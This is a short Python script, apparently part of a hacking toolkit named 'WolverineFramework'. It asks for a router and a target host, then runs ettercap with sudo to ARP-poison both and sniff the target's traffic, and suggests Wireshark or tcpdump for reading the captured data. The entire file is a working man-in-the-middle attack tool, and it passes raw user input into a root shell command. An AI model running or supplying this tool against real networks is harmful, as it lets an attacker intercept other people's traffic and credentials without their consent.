#!/usr/bin/env python3
import os

def MiTM_Attack():
    print("Enter the IP Adsress / Hostname of your target 1 (Router)")
    Target1 = input("WolverineFramework - \033[1;4m Target 1 \033[0m > ")
    print("Enter the IP Address / Hostname of your target 2 (Target being sniffed)")
    Target2 = input("WolverineFramework - \033[1;4m Target 2 \033[0m > ")
    print("\x1B[3m note from the dev, if you want to see the data, use a network reader app such as Wireshark (Graphical) or TCPDump (CLI) \x1B[0m")
    print("Attacking using ettercap...")
    os.system("sudo ettercap -T -S -M arp:remote /" + Target1 + "// /" + Target2+ "//")